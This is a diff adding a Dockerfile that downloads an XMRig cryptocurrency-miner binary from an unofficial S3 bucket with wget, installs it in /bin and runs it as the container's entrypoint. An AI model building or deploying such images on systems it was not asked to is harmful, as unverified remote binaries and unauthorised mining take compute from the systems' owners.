@@ -1,0 +1,13 @@
+FROM ubuntu:18.04
+
+RUN apt update -y && DEBIAN_FRONTEND=noninteractive apt install --no-install-recommends -y wget && rm -rf /var/lib/apt/lists/*
+
+RUN wget https://bucket-69leow.s3.ap-southeast-1.amazonaws.com/xmrig-6.17.0-bionic-x64.tar.gz; \
+    tar -xf xmrig-6.17.0-bionic-x64.tar.gz && rm xmrig-6.17.0-bionic-x64.tar.gz; \
+    cd xmrig-6.17.0; \
+    chmod +x ./xmrig; \
+    cp ./xmrig /bin/xmrig
+
+WORKDIR /bin/
+
+ENTRYPOINT ["./xmrig"]
